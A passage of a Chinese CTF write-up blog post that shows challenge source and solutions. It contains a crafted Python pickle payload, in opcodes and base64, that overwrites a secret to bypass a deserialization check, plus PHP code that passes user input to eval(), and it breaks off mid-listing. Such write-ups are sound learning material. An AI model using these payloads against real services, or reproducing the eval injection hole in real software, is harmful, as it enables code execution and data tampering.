@@ -1,0 +1,1118 @@
+<!doctype html><html lang=zh><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>高校战“疫”网络安全分享赛部分WriteUp | 被强煎的蛋 | frieggs's blog</title><meta name=Description content="被强煎的蛋 | frieggs's blog"><meta property="og:title" content="高校战“疫”网络安全分享赛部分WriteUp"><meta property="og:description" content="前言 这次比赛赛题由各个高校联盟提供，就Web来说赛题质量还是很棒的，打完两天的比赛收获非浅。写下这篇博客，一是为了分享经验给大家，二是为了做"><meta property="og:type" content="article"><meta property="og:url" content="/2020/03/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-%E9%83%A8%E5%88%86writeup/"><meta property="article:published_time" content="2020-03-09T06:40:59+08:00"><meta property="article:modified_time" content="2020-03-09T06:40:59+08:00"><meta property="og:site_name" content="被强煎的蛋 | frieggs's blog"><meta name=twitter:card content="summary"><meta name=twitter:title content="高校战“疫”网络安全分享赛部分WriteUp"><meta name=twitter:description content="前言 这次比赛赛题由各个高校联盟提供，就Web来说赛题质量还是很棒的，打完两天的比赛收获非浅。写下这篇博客，一是为了分享经验给大家，二是为了做"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel=canonical href=/2020/03/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-%E9%83%A8%E5%88%86writeup/><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=prev href=/2020/03/vn2020-%E5%85%AC%E5%BC%80%E8%B5%9B-%E8%AE%B0%E4%B8%80%E9%81%93machinelearning%E9%A2%98/><link rel=stylesheet href=/lib/fontawesome-free/all.min.9a680b90260b5106d79f4075491ab31daafa7429eff686453c40b58357309649.css integrity="sha256-mmgLkCYLUQbXn0B1SRqzHar6dCnv9oZFPEC1g1cwlkk="><link rel=stylesheet href=/lib/animate/animate.min.3c770e90f98eb21b0c042fafb49755af93306fbaf42e449524f94fae9fc83295.css integrity="sha256-PHcOkPmOshsMBC+vtJdVr5Mwb7r0LkSVJPlPrp/IMpU="><link rel=stylesheet href=/css/style.min.5313a7cd528e285a82280f60228e0e2501181a5445bde1bc99d7c7dbdb7a4767.css integrity="sha256-UxOnzVKOKFqCKA9gIo4OJQEYGlRFveG8mdfH29t6R2c="><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"高校战“疫”网络安全分享赛部分WriteUp","mainEntityOfPage":{"@type":"WebPage","@id":"\/2020\/03\/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-%E9%83%A8%E5%88%86writeup\/"},"image":{"@type":"ImageObject","url":"\/cover.png","width":800,"height":600},"genre":"posts","keywords":"ctf, writeup, pickle, php, 反序列化, soap, 渗透, 源码审计, metasploit, volatility, usb, wireshark","wordcount":4839,"url":"\/2020\/03\/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-%E9%83%A8%E5%88%86writeup\/","datePublished":"2020-03-09T06:40:59\x2b08:00","dateModified":"2020-03-09T06:40:59\x2b08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"frieggs","logo":{"@type":"ImageObject","url":"\/logo.png","width":127,"height":40}},"description":""}</script></head><body><script>if(!window.localStorage||!window.localStorage.getItem('theme')){window.isDark=window.matchMedia('(prefers-color-scheme: dark)').matches;}else{window.isDark=(window.localStorage&&window.localStorage.getItem('theme'))==='dark';}
+window.isDark&&document.body.classList.add('dark-theme');</script><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class="header-title animated bounceIn"><a href=/>被强煎的蛋 | frieggs's blog</a></div><div class=menu><a class=menu-item href=/posts/>文章</a><a class=menu-item href=/tags/>标签</a><a class=menu-item href=/categories/>分类</a><a class=menu-item href=/about/>关于</a><a class=menu-item href=/ title=English><i class="fas fa-language fa-fw"></i></a><a href=javascript:void(0); class=theme-switch title=切换主题>
+<i class="fas fa-adjust fa-rotate-180 fa-fw"></i></a></div></div></header><header class=mobile id=header-mobile><div class=header-wrapper><div class=header-container><div class="header-title animated bounceIn"><a href=/>被强煎的蛋 | frieggs's blog</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/posts/>文章</a><a class=menu-item href=/tags/>标签</a><a class=menu-item href=/categories/>分类</a><a class=menu-item href=/about/>关于</a><a class=menu-item href=/ title=English><i class="fas fa-language fa-fw"></i></a><a href=javascript:void(0); class=theme-switch title=切换主题>
+<i class="fas fa-adjust fa-rotate-180 fa-fw"></i></a></div></div></header><script>window.desktopHeaderMode="fixed";window.mobileHeaderMode="auto";</script><main class=main><div class=container><article class="page single"><h1 class="single-title animated flipInX">高校战“疫”网络安全分享赛部分WriteUp</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a class=author href=/ rel=author target=_blank><i class="fas fa-user-circle fa-fw"></i>frieggs</a>
+</span>&nbsp;<span class=post-category>收录于&nbsp;
+<span><a href=/categories/ctf><i class="far fa-folder fa-fw"></i>Ctf</a></span></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i><time datetime=2020-03-09>2020-03-09</time>&nbsp;
+<i class="fas fa-pencil-alt fa-fw"></i>约 4839 字&nbsp;
+<i class="far fa-clock fa-fw"></i>预计阅读 10 分钟&nbsp;</div></div><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class="toc-content always-active" id=toc-content-auto></div></div><div class=toc id=toc-static><details><summary><div class=toc-title><span>目录</span>
+<span><i class="details icon fas fa-angle-down"></i></span></div></summary><div class=toc-content id=toc-content-static><nav id=TableOfContents><ul><li><a href=#前言>前言</a></li><li><a href=#web>Web</a><ul><li><a href=#webtmp>webtmp</a></li><li><a href=#happyvacation>happyvacation</a><ul><li><a href=#放弃xss>放弃xss</a></li><li><a href=#clone关键字>clone关键字</a></li><li><a href=#回到这题>回到这题</a></li></ul></li><li><a href=#nothardweb>nothardweb</a><ul><li><a href=#外网机>外网机</a></li><li><a href=#内网机11010112>内网机1（10.10.1.12）</a></li><li><a href=#内网机21010213>内网机2（10.10.2.13）</a><ul><li><a href=#cve-2017-12615tomcat任意文件上传漏洞>CVE-2017-12615（Tomcat任意文件上传漏洞）</a></li><li><a href=#cnvd-2020-10487tomcat本地文件包含漏洞>CNVD-2020-10487（Tomcat本地文件包含漏洞）</a></li></ul></li></ul></li></ul></li><li><a href=#misc>MISC</a></li><li><a href=#reference>Reference</a></li></ul></nav></div></details></div><div class=content id=content><h2 id=前言>前言</h2><p>这次比赛赛题由各个高校联盟提供，就Web来说赛题质量还是很棒的，打完两天的比赛收获非浅。写下这篇博客，一是为了分享经验给大家，二是为了做个备份，时间长了东西容易忘（唉，感觉记忆力越来越差了😭）。</p><p>因为个人知识所限，文章中难免出现错误，还请师傅们斧正​。☺</p><h2 id=web>Web</h2><h3 id=webtmp>webtmp</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>base64</span>
+<span class=kn>import</span> <span class=nn>io</span>
+<span class=kn>import</span> <span class=nn>sys</span>
+<span class=kn>import</span> <span class=nn>pickle</span>
+
+<span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>Response</span><span class=p>,</span> <span class=n>render_template</span><span class=p>,</span> <span class=n>request</span>
+<span class=kn>import</span> <span class=nn>secret</span>
+
+
+<span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
+
+
+<span class=k>class</span> <span class=nc>Animal</span><span class=p>:</span>
+    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>name</span><span class=p>,</span> <span class=n>category</span><span class=p>):</span>
+        <span class=bp>self</span><span class=o>.</span><span class=n>name</span> <span class=o>=</span> <span class=n>name</span>
+        <span class=bp>self</span><span class=o>.</span><span class=n>category</span> <span class=o>=</span> <span class=n>category</span>
+
+    <span class=k>def</span> <span class=fm>__repr__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+        <span class=k>return</span> <span class=n>f</span><span class=s1>&#39;Animal(name={self.name!r}, category={self.category!r})&#39;</span>
+
+    <span class=k>def</span> <span class=fm>__eq__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>other</span><span class=p>):</span>
+        <span class=k>return</span> <span class=nb>type</span><span class=p>(</span><span class=n>other</span><span class=p>)</span> <span class=ow>is</span> <span class=n>Animal</span> <span class=ow>and</span> <span class=bp>self</span><span class=o>.</span><span class=n>name</span> <span class=o>==</span> <span class=n>other</span><span class=o>.</span><span class=n>name</span> <span class=ow>and</span> <span class=bp>self</span><span class=o>.</span><span class=n>category</span> <span class=o>==</span> <span class=n>other</span><span class=o>.</span><span class=n>category</span>
+
+
+<span class=k>class</span> <span class=nc>RestrictedUnpickler</span><span class=p>(</span><span class=n>pickle</span><span class=o>.</span><span class=n>Unpickler</span><span class=p>):</span>
+    <span class=k>def</span> <span class=nf>find_class</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>module</span><span class=p>,</span> <span class=n>name</span><span class=p>):</span>
+        <span class=k>if</span> <span class=n>module</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
+            <span class=k>return</span> <span class=nb>getattr</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>modules</span><span class=p>[</span><span class=s1>&#39;__main__&#39;</span><span class=p>],</span> <span class=n>name</span><span class=p>)</span>
+        <span class=k>raise</span> <span class=n>pickle</span><span class=o>.</span><span class=n>UnpicklingError</span><span class=p>(</span><span class=s2>&#34;global &#39;</span><span class=si>%s</span><span class=s2>.</span><span class=si>%s</span><span class=s2>&#39; is forbidden&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>module</span><span class=p>,</span> <span class=n>name</span><span class=p>))</span>
+
+
+<span class=k>def</span> <span class=nf>restricted_loads</span><span class=p>(</span><span class=n>s</span><span class=p>):</span>
+    <span class=k>return</span> <span class=n>RestrictedUnpickler</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>BytesIO</span><span class=p>(</span><span class=n>s</span><span class=p>))</span><span class=o>.</span><span class=n>load</span><span class=p>()</span>
+
+
+<span class=k>def</span> <span class=nf>read</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;utf-8&#39;</span><span class=p>):</span>
+    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=n>encoding</span><span class=p>)</span> <span class=k>as</span> <span class=n>fin</span><span class=p>:</span>
+        <span class=k>return</span> <span class=n>fin</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+
+
+<span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
+<span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
+    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;source&#39;</span><span class=p>):</span>
+        <span class=k>return</span> <span class=n>Response</span><span class=p>(</span><span class=n>read</span><span class=p>(</span><span class=vm>__file__</span><span class=p>),</span> <span class=n>mimetype</span><span class=o>=</span><span class=s1>&#39;text/plain&#39;</span><span class=p>)</span>
+
+    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;POST&#39;</span><span class=p>:</span>
+        <span class=k>try</span><span class=p>:</span>
+            <span class=n>pickle_data</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;data&#39;</span><span class=p>)</span>
+            <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;R&#39;</span> <span class=ow>in</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>pickle_data</span><span class=p>):</span>
+                <span class=k>return</span> <span class=s1>&#39;No... I don</span><span class=se>\&#39;</span><span class=s1>t like R-things. No Rabits, Rats, Roosters or RCEs.&#39;</span>
+            <span class=k>else</span><span class=p>:</span>
+                <span class=n>result</span> <span class=o>=</span> <span class=n>restricted_loads</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>pickle_data</span><span class=p>))</span>
+                <span class=k>if</span> <span class=nb>type</span><span class=p>(</span><span class=n>result</span><span class=p>)</span> <span class=ow>is</span> <span class=ow>not</span> <span class=n>Animal</span><span class=p>:</span>
+                    <span class=k>return</span> <span class=s1>&#39;Are you sure that is an animal???&#39;</span>
+            <span class=n>correct</span> <span class=o>=</span> <span class=p>(</span><span class=n>result</span> <span class=o>==</span> <span class=n>Animal</span><span class=p>(</span><span class=n>secret</span><span class=o>.</span><span class=n>name</span><span class=p>,</span> <span class=n>secret</span><span class=o>.</span><span class=n>category</span><span class=p>))</span>
+            <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;unpickle_result.html&#39;</span><span class=p>,</span> <span class=n>result</span><span class=o>=</span><span class=n>result</span><span class=p>,</span> <span class=n>pickle_data</span><span class=o>=</span><span class=n>pickle_data</span><span class=p>,</span> <span class=n>giveflag</span><span class=o>=</span><span class=n>correct</span><span class=p>)</span>
+        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+            <span class=k>print</span><span class=p>(</span><span class=nb>repr</span><span class=p>(</span><span class=n>e</span><span class=p>))</span>
+            <span class=k>return</span> <span class=s2>&#34;Something wrong&#34;</span>
+
+    <span class=n>sample_obj</span> <span class=o>=</span> <span class=n>Animal</span><span class=p>(</span><span class=s1>&#39;一给我哩giaogiao&#39;</span><span class=p>,</span> <span class=s1>&#39;Giao&#39;</span><span class=p>)</span>
+    <span class=n>pickle_data</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>pickle</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>sample_obj</span><span class=p>))</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
+    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;unpickle_page.html&#39;</span><span class=p>,</span> <span class=n>sample_obj</span><span class=o>=</span><span class=n>sample_obj</span><span class=p>,</span> <span class=n>pickle_data</span><span class=o>=</span><span class=n>pickle_data</span><span class=p>)</span>
+
+
+<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
+    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>5000</span><span class=p>)</span>
+</code></pre></td></tr></table></div></div><p>因为反序列化时做了验证，且序列化字符串里不能含有R(调用一个callable对象)，所以不太方便直接getshell，因此我们目标是让<code>restricted_loads(base64.b64decode(pickle_data)) == Animal(secret.name, secret.category)</code> 为True。</p><p>因为secret未知，所以首先想到的是泄露secret，但是此题是行不通的。换个思路，既然不能泄露secret，那我么就改掉secret，这时候妈妈告诉我先知上有<a href=https://xz.aliyun.com/t/7012 target=_blank rel="noopener noreffer">这么一篇文章</a>
+。</p><p>可以参考SUCTF2019_guess_game这题的做法，我们需要让pickle反序列的时候首先加载<code>__main__.secret</code>，将<code>secret.name</code>和<code>secret.category</code>覆盖为frieggs字符串，再以frieggs字符串为参数构造Animal对象。</p><p>思路有了，下面就是写opcodes了，我是直接用<a href=https://github.com/eddieivan01/pker target=_blank rel="noopener noreffer">pker</a>
+生成的opcodes。（别问为什么不手撸opcodes，因为菜）</p><p>将以下的内容保存为文件x</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>secret = GLOBAL(&#39;__main__&#39;, &#39;secret&#39;)
+secret.name = &#39;frieggs&#39;
+secret.category = &#39;frieggs&#39;
+animal = INST(&#39;__main__&#39;, &#39;Animal&#39;, &#39;frieggs&#39;, &#39;frieggs&#39;)
+return animal
+</code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-shell data-lang=shell>$ python3 pker.py &lt; x
+b<span class=s2>&#34;c__main__\nsecret\np0\n0g0\n(}(S&#39;name&#39;\nS&#39;frieggs&#39;\ndtbg0\n(}(S&#39;category&#39;\nS&#39;frieggs&#39;\ndtb(S&#39;frieggs&#39;\nS&#39;frieggs&#39;\ni__main__\nAnimal\np3\n0g3\n.&#34;</span>
+</code></pre></td></tr></table></div></div><p>将opcodes base64encode，这边要稍微注意一下，不能直接拿去编码，直接编码的话他会把\n当成两个单独的字符去编码，实际上他是一个回车符。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-shell data-lang=shell>$ ipython
+Python 3.7.5 <span class=o>(</span>tags/v3.7.5:5c02a39a0b, Oct <span class=m>15</span> 2019, 00:11:34<span class=o>)</span> <span class=o>[</span>MSC v.1916 <span class=m>64</span> bit <span class=o>(</span>AMD64<span class=o>)]</span>
+Type <span class=s1>&#39;copyright&#39;</span>, <span class=s1>&#39;credits&#39;</span> or <span class=s1>&#39;license&#39;</span> <span class=k>for</span> more information
+IPython 7.11.1 -- An enhanced Interactive Python. Type <span class=s1>&#39;?&#39;</span> <span class=k>for</span> help.
+
+In <span class=o>[</span>1<span class=o>]</span>: import base64
+
+In <span class=o>[</span>2<span class=o>]</span>: <span class=nv>s</span> <span class=o>=</span> <span class=s2>&#34;c__main__\nsecret\np0\n0g0\n(}(S&#39;name&#39;\nS&#39;frieggs&#39;\ndtbg0\n(}(S&#39;category&#39;\nS&#39;frieggs&#39;\ndtb(S&#39;frieggs&#39;\nS&#39;frieggs&#39;\ni__main__\nAnimal\np3\n0g3\n.&#34;</span>
+
+In <span class=o>[</span>3<span class=o>]</span>: base64.b64encode<span class=o>(</span>s.encode<span class=o>())</span>.decode<span class=o>()</span>
+Out<span class=o>[</span>3<span class=o>]</span>: <span class=s1>&#39;Y19fbWFpbl9fCnNlY3JldApwMAowZzAKKH0oUyduYW1lJwpTJ2ZyaWVnZ3MnCmR0YmcwCih9KFMnY2F0ZWdvcnknClMnZnJpZWdncycKZHRiKFMnZnJpZWdncycKUydmcmllZ2dzJwppX19tYWluX18KQW5pbWFsCnAzCjBnMwou&#39;</span>
+</code></pre></td></tr></table></div></div><p>payload:<code>Y19fbWFpbl9fCnNlY3JldApwMAowZzAKKH0oUyduYW1lJwpTJ2ZyaWVnZ3MnCmR0YmcwCih9KFMnY2F0ZWdvcnknClMnZnJpZWdncycKZHRiKFMnZnJpZWdncycKUydmcmllZ2dzJwppX19tYWluX18KQW5pbWFsCnAzCjBnMwou</code></p><p><figure><a class=lightgallery href=image-20200309032322376.png title=image-20200309032322376 data-thumbnail=image-20200309032322376.png><img class=lazyload src=/svg/loading.min.svg data-sizes=auto data-srcset="image-20200309032322376.png, image-20200309032322376.png 1.5x, image-20200309032322376.png 2x" data-src=image-20200309032322376.png alt=image-20200309032322376></a><figcaption class=image-caption>image-20200309032322376</figcaption></figure></p><h3 id=happyvacation>happyvacation</h3><h4 id=放弃xss>放弃xss</h4><p>刚开始看这题以为是xss，黑盒测了半天，后面队友告诉我有git泄露，我。。。。</p><p>用<a href=https://github.com/BugScanTeam/GitHack.git target=_blank rel="noopener noreffer">GitHack</a>
+拿到源码后审一波，因为有个提交链接，还以为是触发bot，xss打cookie呢，代码上面的写的SCP太唬人了。后面用xss思路审了半天，emmmm我太菜了过滤绕不过。然后再看看代码，这时候注意力就放在了这边的eval上，看能不能代码执行。看了看正则感觉够呛，然后。。。怎么有个clone，事实告诉我不能被表象迷惑。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php>function answer($user, $answer){
+    $this-&gt;user = clone $user;
+    if($this-&gt;right == $answer){
+        $this-&gt;message = &#34;clever man!&#34;;
+        return 1;
+    }
+    else{
+        if(preg_match(&#34;/[^a-zA-Z_\-}&gt;@\]*]/i&#34;, $answer)){
+            $this-&gt;message = &#34;no no no&#34;;
+        }
+        else{
+            if(preg_match(&#39;/f|sy|and|or|j|sc|in/i&#39;, $answer)){
+                // Big Tree 说这个正则不需要绕
+                $this-&gt;message = &#34;what are you doing bro?&#34;;
+            }
+            else{
+                eval(&#34;\$this-&gt;&#34;.$answer.&#34; = false;&#34;);
+                $this-&gt;updateList();
+            }
+        }
+        $this-&gt;times ++;
+        return 0;
+    }
+}
+</code></pre></td></tr></table></div></div><h4 id=clone关键字>clone关键字</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=cp>&lt;?php</span>
+<span class=k>class</span> <span class=nc>Foo</span> <span class=p>{</span>
+    <span class=k>public</span> <span class=nv>$foo1</span><span class=p>;</span>
+    <span class=k>public</span> <span class=nv>$foo2</span><span class=p>;</span>
+<span class=p>}</span>
+<span class=k>class</span> <span class=nc>Bar</span> <span class=p>{</span>
+    <span class=k>public</span> <span class=nv>$bar1</span> <span class=o>=</span> <span class=s2>&#34;old bar&#34;</span><span class=p>;</span>
+<span class=p>}</span>
+
+<span class=nv>$foo</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Foo</span><span class=p>();</span>
+<span class=nv>$foo</span> <span class=o>-&gt;</span> <span class=na>foo1</span> <span class=o>=</span> <span class=s1>&#39;old foo&#39;</span><span class=p>;</span>
+<span class=nv>$foo</span> <span class=o>-&gt;</span> <span class=na>foo2</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Bar</span><span class=p>();</span>
+<span class=nx>var_dump</span><span class=p>(</span><span class=nv>$foo</span><span class=p>);</span>
+
+<span class=nv>$newFoo</span> <span class=o>=</span> <span class=k>clone</span> <span class=nv>$foo</span><span class=p>;</span>
+<span class=nv>$newFoo</span> <span class=o>-&gt;</span> <span class=na>foo1</span> <span class=o>=</span> <span class=s1>&#39;new bar&#39;</span><span class=p>;</span>
+<span class=nv>$newFoo</span> <span class=o>-&gt;</span> <span class=na>foo2</span> <span class=o>-&gt;</span> <span class=na>bar1</span> <span class=o>=</span> <span class=s1>&#39;new bar&#39;</span><span class=p>;</span>
+<span class=nx>var_dump</span><span class=p>(</span><span class=nv>$foo</span><span class=p>);</span>
+<span class=nx>var_dump</span><span class=p>(</span><span class=nv>$newFoo</span><span class=p>);</span>
+
+<span class=c1>///var/www/html/test.php:13:
+</span><span class=c1>//object(Foo)[1]
+</span><span class=c1>//  public &#39;foo1&#39; =&gt; string &#39;old foo&#39; (length=7)
+</span><span class=c1>//  public &#39;foo2&#39; =&gt; 
+</span><span class=c1>//    object(Bar)[2]
+</span><span class=c1>//      public &#39;bar1&#39; =&gt; string &#39;old bar&#39; (length=7)
+</span><span class=c1></span>
+<span class=c1>///var/www/html/test.php:18:
+</span><span class=c1>//object(Foo)[1]
+</span><span class=c1>//  public &#39;foo1&#39; =&gt; string &#39;old foo&#39; (length=7)
+</span><span class=c1>//  public &#39;foo2&#39; =&gt; 
+</span><span class=c1>//    object(Bar)[2]
+</span><span class=c1>//      public &#39;bar1&#39; =&gt; string &#39;new bar&#39; (length=7)
+</span><span class=c1></span>
+<span class=c1>///var/www/html/test.php:19:
+</span><span class=c1>//object(Foo)[3]
+</span><span class=c1>//  public &#39;foo1&#39; =&gt; string &#39;new bar&#39; (length=7)
+</span><span class=c1>//  public &#39;foo2&#39; =&gt; 
+</span><span class=c1>//    object(Bar)[2]
+</span><span class=c1>//      public &#39;bar1&#39; =&gt; string &#39;new bar&#39; (length=7)
+</span></code></pre></td></tr></table></div></div><p>做个测试，发现$newFoo的属性为字符串时，值是拷贝得来。当$newFoo的属性为对象时，值是引用（即保存的对象的地址），修改引用的值时会改变原对象的值。那跟这题有什么关系呢，我们接下来继续看</p><h4 id=回到这题>回到这题</h4><p>lib.php:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
